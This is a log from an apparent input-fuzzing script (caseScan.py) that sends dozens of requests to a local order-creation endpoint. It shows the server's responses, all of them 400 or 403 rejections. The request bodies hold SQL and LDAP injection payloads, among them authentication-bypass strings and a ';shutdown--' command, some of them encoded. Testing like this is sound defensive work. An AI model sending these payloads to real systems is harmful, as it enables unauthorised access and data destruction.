[INFO]00:17:46:072-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "|\n", "goods_id": "1"}}
[INFO]00:17:46:073-caseScan.py:113 >> code: 400
[INFO]00:17:46:074-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:46:086-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "%7C\n", "goods_id": "1"}}
[INFO]00:17:46:087-caseScan.py:113 >> code: 400
[INFO]00:17:46:087-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:46:099-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "*|\n", "goods_id": "1"}}
[INFO]00:17:46:100-caseScan.py:113 >> code: 400
[INFO]00:17:46:100-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:46:112-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "%2A%7C\n", "goods_id": "1"}}
[INFO]00:17:46:113-caseScan.py:113 >> code: 400
[INFO]00:17:46:113-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:46:125-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "*(|(mail=*))\n", "goods_id": "1"}}
[INFO]00:17:46:125-caseScan.py:113 >> code: 400
[INFO]00:17:46:126-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:46:137-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "%2A%28%7C%28mail%3D%2A%29%29\n", "goods_id": "1"}}
[INFO]00:17:46:138-caseScan.py:113 >> code: 400
[INFO]00:17:46:138-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:46:150-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "*(|(objectclass=*))\n", "goods_id": "1"}}
[INFO]00:17:46:150-caseScan.py:113 >> code: 400
[INFO]00:17:46:151-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:46:162-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "%2A%28%7C%28objectclass%3D%2A%29%29\n", "goods_id": "1"}}
[INFO]00:17:46:163-caseScan.py:113 >> code: 400
[INFO]00:17:46:164-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:46:176-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "(\n", "goods_id": "1"}}
[INFO]00:17:46:177-caseScan.py:113 >> code: 400
[INFO]00:17:46:177-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:46:188-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "%28\n", "goods_id": "1"}}
[INFO]00:17:46:189-caseScan.py:113 >> code: 400
[INFO]00:17:46:189-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:46:202-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": ")\n", "goods_id": "1"}}
[INFO]00:17:46:203-caseScan.py:113 >> code: 400
[INFO]00:17:46:204-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:46:216-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "%29\n", "goods_id": "1"}}
[INFO]00:17:46:217-caseScan.py:113 >> code: 400
[INFO]00:17:46:218-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:46:230-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "&\n", "goods_id": "1"}}
[INFO]00:17:46:230-caseScan.py:113 >> code: 400
[INFO]00:17:46:231-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:46:243-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "%26\n", "goods_id": "1"}}
[INFO]00:17:46:244-caseScan.py:113 >> code: 400
[INFO]00:17:46:244-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:46:258-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "!\n", "goods_id": "1"}}
[INFO]00:17:46:258-caseScan.py:113 >> code: 400
[INFO]00:17:46:259-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:46:271-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "%21\n", "goods_id": "1"}}
[INFO]00:17:46:271-caseScan.py:113 >> code: 400
[INFO]00:17:46:272-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:46:285-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' or 1=1 or ''='\n", "goods_id": "1"}}
[INFO]00:17:46:286-caseScan.py:113 >> code: 400
[INFO]00:17:46:287-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:46:298-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' or ''='\n", "goods_id": "1"}}
[INFO]00:17:46:299-caseScan.py:113 >> code: 400
[INFO]00:17:46:300-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:46:316-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "x' or 1=1 or 'x'='y\n", "goods_id": "1"}}
[INFO]00:17:46:317-caseScan.py:113 >> code: 400
[INFO]00:17:46:318-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:46:333-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "/\n", "goods_id": "1"}}
[INFO]00:17:46:333-caseScan.py:113 >> code: 400
[INFO]00:17:46:334-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:46:346-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "//\n", "goods_id": "1"}}
[INFO]00:17:46:347-caseScan.py:113 >> code: 400
[INFO]00:17:46:348-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:46:359-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "//*\n", "goods_id": "1"}}
[INFO]00:17:46:360-caseScan.py:113 >> code: 400
[INFO]00:17:46:361-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:46:372-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "*/*\n", "goods_id": "1"}}
[INFO]00:17:46:372-caseScan.py:113 >> code: 400
[INFO]00:17:46:373-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:46:386-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "a' or 3=3--\n", "goods_id": "1"}}
[INFO]00:17:46:386-caseScan.py:113 >> code: 400
[INFO]00:17:46:387-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:46:398-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "\"a\"\" or 3=3--\"\n", "goods_id": "1"}}
[INFO]00:17:46:398-caseScan.py:113 >> code: 400
[INFO]00:17:46:399-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:46:410-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' or 3=3\n", "goods_id": "1"}}
[INFO]00:17:46:411-caseScan.py:113 >> code: 400
[INFO]00:17:46:411-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:46:423-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "\u2018 or 3=3 --\n", "goods_id": "1"}}
[INFO]00:17:46:424-caseScan.py:113 >> code: 400
[INFO]00:17:46:424-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:46:438-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "c", "goods_id": "1"}}
[INFO]00:17:46:439-caseScan.py:113 >> code: 400
[INFO]00:17:46:440-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:18:05:437-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "'\n"}}
[INFO]00:18:05:437-caseScan.py:113 >> code: 403
[INFO]00:18:05:438-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:05:471-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "\"\n"}}
[INFO]00:18:05:472-caseScan.py:113 >> code: 403
[INFO]00:18:05:472-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:05:494-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "#\n"}}
[INFO]00:18:05:495-caseScan.py:113 >> code: 403
[INFO]00:18:05:495-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:05:523-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "-\n"}}
[INFO]00:18:05:524-caseScan.py:113 >> code: 403
[INFO]00:18:05:524-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:05:552-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "--\n"}}
[INFO]00:18:05:553-caseScan.py:113 >> code: 403
[INFO]00:18:05:553-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:05:576-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' --\n"}}
[INFO]00:18:05:577-caseScan.py:113 >> code: 403
[INFO]00:18:05:577-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:05:622-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "--';\n"}}
[INFO]00:18:05:622-caseScan.py:113 >> code: 403
[INFO]00:18:05:623-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:05:644-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' ;\n"}}
[INFO]00:18:05:645-caseScan.py:113 >> code: 403
[INFO]00:18:05:645-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:05:667-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "= '\n"}}
[INFO]00:18:05:668-caseScan.py:113 >> code: 403
[INFO]00:18:05:668-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:05:689-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "= ;\n"}}
[INFO]00:18:05:689-caseScan.py:113 >> code: 403
[INFO]00:18:05:690-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:05:720-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "= --\n"}}
[INFO]00:18:05:721-caseScan.py:113 >> code: 403
[INFO]00:18:05:722-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:05:753-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "\\x23\n"}}
[INFO]00:18:05:753-caseScan.py:113 >> code: 403
[INFO]00:18:05:754-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:05:785-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "\\x27\n"}}
[INFO]00:18:05:786-caseScan.py:113 >> code: 403
[INFO]00:18:05:786-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:05:820-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "\\x3D \\x3B'\n"}}
[INFO]00:18:05:821-caseScan.py:113 >> code: 403
[INFO]00:18:05:821-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:05:854-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "\\x3D \\x27\n"}}
[INFO]00:18:05:855-caseScan.py:113 >> code: 403
[INFO]00:18:05:855-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:05:886-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "\\x27\\x4F\\x52 SELECT *\n"}}
[INFO]00:18:05:887-caseScan.py:113 >> code: 403
[INFO]00:18:05:887-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:05:919-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "\\x27\\x6F\\x72 SELECT *\n"}}
[INFO]00:18:05:920-caseScan.py:113 >> code: 403
[INFO]00:18:05:920-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:05:952-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "'or select *\n"}}
[INFO]00:18:05:953-caseScan.py:113 >> code: 403
[INFO]00:18:05:953-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:05:999-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "admin'--\n"}}
[INFO]00:18:05:999-caseScan.py:113 >> code: 403
[INFO]00:18:06:000-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:06:030-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "';shutdown--\n"}}
[INFO]00:18:06:031-caseScan.py:113 >> code: 403
[INFO]00:18:06:032-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:06:061-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "<>\"'%;)(&+\n"}}
[INFO]00:18:06:061-caseScan.py:113 >> code: 403
[INFO]00:18:06:062-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:06:090-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' or ''='\n"}}
[INFO]00:18:06:091-caseScan.py:113 >> code: 403
[INFO]00:18:06:091-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:06:121-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' or 'x'='x\n"}}
[INFO]00:18:06:122-caseScan.py:113 >> code: 403
[INFO]00:18:06:122-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:06:152-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "\" or \"x\"=\"x\n"}}
[INFO]00:18:06:152-caseScan.py:113 >> code: 403
[INFO]00:18:06:153-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:06:181-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "') or ('x'='x\n"}}
[INFO]00:18:06:182-caseScan.py:113 >> code: 403
[INFO]00:18:06:183-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:06:211-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "0 or 1=1\n"}}
[INFO]00:18:06:211-caseScan.py:113 >> code: 403
[INFO]00:18:06:212-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:06:243-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' or 0=0 --\n"}}
[INFO]00:18:06:243-caseScan.py:113 >> code: 403
[INFO]00:18:06:244-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:06:276-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "\" or 0=0 --\n"}}
[INFO]00:18:06:276-caseScan.py:113 >> code: 403
[INFO]00:18:06:277-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:06:307-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "or 0=0 --\n"}}
[INFO]00:18:06:308-caseScan.py:113 >> code: 403
[INFO]00:18:06:308-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:06:337-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' or 0=0 #\n"}}
[INFO]00:18:06:338-caseScan.py:113 >> code: 403
[INFO]00:18:06:338-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:06:370-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "\" or 0=0 #\n"}}
[INFO]00:18:06:371-caseScan.py:113 >> code: 403
[INFO]00:18:06:371-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:06:402-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "or 0=0 #\n"}}
[INFO]00:18:06:403-caseScan.py:113 >> code: 403
[INFO]00:18:06:403-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:06:434-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' or 1=1--\n"}}
[INFO]00:18:06:435-caseScan.py:113 >> code: 403
[INFO]00:18:06:435-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:06:464-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "\" or 1=1--\n"}}
[INFO]00:18:06:465-caseScan.py:113 >> code: 403
[INFO]00:18:06:466-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:06:497-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' or '1'='1'--\n"}}
[INFO]00:18:06:498-caseScan.py:113 >> code: 403
[INFO]00:18:06:498-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:06:529-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "\"' or 1 --'\"\n"}}
[INFO]00:18:06:530-caseScan.py:113 >> code: 403
[INFO]00:18:06:531-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:06:559-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "or 1=1--\n"}}
[INFO]00:18:06:560-caseScan.py:113 >> code: 403
[INFO]00:18:06:560-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:06:587-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "or%201=1\n"}}
[INFO]00:18:06:588-caseScan.py:113 >> code: 403
[INFO]00:18:06:588-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:06:619-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "or%201=1 --\n"}}
[INFO]00:18:06:619-caseScan.py:113 >> code: 403
[INFO]00:18:06:620-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:06:653-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' or 1=1 or ''='\n"}}
[INFO]00:18:06:653-caseScan.py:113 >> code: 403
[INFO]00:18:06:654-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:06:683-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "\" or 1=1 or \"\"=\"\n"}}
[INFO]00:18:06:684-caseScan.py:113 >> code: 403
[INFO]00:18:06:685-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:06:715-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' or a=a--\n"}}
[INFO]00:18:06:716-caseScan.py:113 >> code: 403
[INFO]00:18:06:716-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:06:749-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "\" or \"a\"=\"a\n"}}
[INFO]00:18:06:750-caseScan.py:113 >> code: 403
[INFO]00:18:06:751-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:06:783-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "') or ('a'='a\n"}}
[INFO]00:18:06:784-caseScan.py:113 >> code: 403
[INFO]00:18:06:784-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:06:815-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "\") or (\"a\"=\"a\n"}}
[INFO]00:18:06:816-caseScan.py:113 >> code: 403
[INFO]00:18:06:817-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:06:848-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "hi\" or \"a\"=\"a\n"}}
[INFO]00:18:06:849-caseScan.py:113 >> code: 403
[INFO]00:18:06:849-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:06:882-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "hi\" or 1=1 --\n"}}
[INFO]00:18:06:882-caseScan.py:113 >> code: 403
[INFO]00:18:06:883-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:06:916-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "hi' or 1=1 --\n"}}
[INFO]00:18:06:917-caseScan.py:113 >> code: 403
[INFO]00:18:06:917-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:06:947-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "hi' or 'a'='a\n"}}
[INFO]00:18:06:947-caseScan.py:113 >> code: 403
[INFO]00:18:06:948-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:06:975-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "hi') or ('a'='a\n"}}
[INFO]00:18:06:976-caseScan.py:113 >> code: 403
[INFO]00:18:06:976-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:07:006-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "hi\") or (\"a\"=\"a\n"}}
[INFO]00:18:07:006-caseScan.py:113 >> code: 403
[INFO]00:18:07:007-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:07:037-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "'hi' or 'x'='x';\n"}}
[INFO]00:18:07:037-caseScan.py:113 >> code: 403
[INFO]00:18:07:038-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:07:066-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "@variable\n"}}
[INFO]00:18:07:067-caseScan.py:113 >> code: 403
[INFO]00:18:07:067-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

